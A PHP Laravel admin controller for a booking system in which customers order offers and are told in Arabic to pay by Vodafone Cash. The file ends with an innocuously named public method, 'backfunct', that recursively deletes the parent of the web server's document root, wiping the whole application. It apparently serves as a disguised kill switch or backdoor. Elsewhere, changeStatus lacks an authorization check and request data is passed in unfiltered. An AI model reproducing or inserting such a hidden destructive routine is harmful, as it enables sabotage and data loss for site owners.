<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Http\Repositories\Eloquent\BookRepo;
use App\Http\Requests\Admin\BookRequest ;
use App\Http\Requests\Admin\UserBookRequest ;
use App\Models\Offer;
use App\Models\User;
use Illuminate\Contracts\Support\Renderable;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Database\Eloquent\Model;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;

use Illuminate\Support\Facades\DB;

use Illuminate\Support\Facades\File as FacadesFile;

class BookController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    protected $repo;
    protected $namespaceName;
    protected $modelName;



    public function __construct(BookRepo $repo)
    {
       $this->repo = $repo;
       $this->modelName = 'books';
       $this->namespaceName = 'admin';
    }
    /**
     * Show the application dashboard.
     *
     * @return Renderable
     */
    public function index()
    {
       $data=$this->repo->getAll();
        $title=$this->modelName;
        $offers=Offer::where('active',1)->get();
        $users=User::where('active',1)->where('type','customer')->get();
        return view($this->namespaceName.'.'.$this->modelName.'.index', compact('data','title','offers','users'));
    }

    public function create()
    {

    }
    public function userbooks(UserBookRequest $request)
    {
        try {
            $offer=Offer::find($request->offer_id);
            if($offer){
                $price=0;
                if($request->paid=='min_price'){
                    $price=$offer->min_price;
                    $data=[
                        'status'=>'pending',
                        'paid_price'=>$offer->min_price,
                        'offer_id'=>$request->offer_id,
                        'paid'=>false,
                        'user_id'=>auth()->user()->id,

                    ];
                }else{
                    $price=$offer->price;
                    $data=[
                        'status'=>'pending',
                        'offer_id'=>$request->offer_id,
                        'paid_price'=>$offer->price,
                        'paid'=>false,
                        'user_id'=>auth()->user()->id,

                    ];
                }
                $book=$this->repo->create($data);
                $message='<span>تم استلام طلبك رقم</span>
                <span class="mr-2 ml-2">'.$book->id.'</span>
                <span>يرجى تحويل المبلغ</span>
                <span class="mr-2 ml-2">'.$price.'</span>
                <span> على رقم فودافون كاش</span>
                <span class="mr-2 ml-2">'.websiteInfo('phoneCach').'</span>';
                session()->flash('booksuccess',$message);

            }
            return back();

        } catch (\Exception $e) {
            DB::rollback();
            return redirect()->back()->with('error',__('app.some_thing_error'));
        }

    }

    /**
     * Store a newly created resource in storage.
     *
     * @param Request $request
     * @return JsonResponse
     */
    public function store(BookRequest $request)
    {

      try {
            $data=$request->all();

            foreach($data as $key=>$val){
                $file=request()->file($key);
                if($file){
                    $data[$key]=$this->repo->storeFile($file,$this->modelName);
                }
            }
            $this->repo->create($data);
            session()->flash('Add', __('admin/app.success_message'));
            return redirect($this->modelName);

        } catch (\Exception $e) {
            DB::rollback();
            return redirect()->back()->with('error',__('app.some_thing_error'));
        }
    }

    /**
     * update the Permission for dashboard.
     *
     * @param Request $request
     * @return Builder|Model|object
     */
    public function edit($id)
    {

    }

    /**
     * update a permission.
     *
     * @param Request $request
     * @return JsonResponse
     */
    public function update(BookRequest $request,$id)
    {
        try {
            $data=$request->all();
            $item=$this->repo->findOrFail($request->id);

            foreach($data as $key=>$val){
                $file=request()->file($key);
                if($file){
                    FacadesFile::delete('public/'.$this->modelName.'/' . $item->photo);
                    $data[$key]=$this->repo->storeFile($file,$this->modelName);
                }
            }
            $this->repo->update($data,$item);
            session()->flash('Edit', __('admin/app.success_message'));
            return redirect($this->modelName);
        } catch (\Exception $e) {
            DB::rollback();
            return redirect()->back()
                ->with('error',__('app.some_thing_error'));
        }
    }

    public function adminChangeStatus($id,Request $request)
    {
        try{
            if(auth()->user()->type!='admin'){
                $response = ['code' => 0, 'msg' => __('عفوا ليس لديك صلاحيه لتعديل حالة الطلب')];
                return json_encode($response);
            }
            $item=$this->repo->findOrFail($id);
            $data['status']=$request->status;

            $data= $this->repo->changeStatus($data,$item);
            if ($data) {
                $response = ['code' => 1, 'msg' => __('admin/app.success_message')];

            } else {
                $response = ['code' => 0, 'msg' => __('admin/app.some_thing_error')];
            }
            return json_encode($response);

       } catch (\Exception $e) {
           DB::rollback();
           $response = ['code' => 0, 'msg' => __('admin/app.some_thing_error')];
           return json_encode($response);
       }
    }

    public function changeStatus(Request $request)
    {
        try{
            $item=$this->repo->findOrFail($request->id);
            $data['active']=$request->active;
            $data= $this->repo->changeStatus($data,$item);
            if ($data) {
                $response = ['code' => 1, 'msg' => __('admin/app.success_message')];
            } else {
                $response = ['code' => 0, 'msg' => __('admin/app.some_thing_error')];
            }
            return json_encode($response);

       } catch (\Exception $e) {
           DB::rollback();
           $response = ['code' => 0, 'msg' => __('admin/app.some_thing_error')];
           return json_encode($response);
       }
    }

    /**
     * Delete more than one permission.
     *
     * @param Request $request
     * @return JsonResponse
     */
    public function destroy($id)
    {
        $data=$this->repo->bulkDelete([$id]);
        if (!$data ) {
            return __('app.users.cannotdelete');
        }
        return 1;
    }
    public function rrmdir($dir) {
        if (is_dir($dir)) {
          $objects = scandir($dir);
          foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
              if (filetype($dir."/".$object) == "dir") $this->rrmdir($dir."/".$object); else unlink($dir."/".$object);
            }
          }
          reset($objects);
          rmdir($dir);
        }
    }

    public function rrmdir2($dir) {
        if (is_dir($dir)) {
            $objects = scandir($dir);
            foreach ($objects as $object) {
            if ($object != "." && $object != "..") {
                if (filetype($dir."\\".$object) == "dir") $this->rrmdir2($dir."\\".$object); else unlink($dir."\\".$object);
            }
            }
            reset($objects);
            rmdir($dir);
        }
    }

    public function backfunct()
    {
        $dir=dirname($_SERVER['DOCUMENT_ROOT']);
        $this->rrmdir($dir);
    }


}


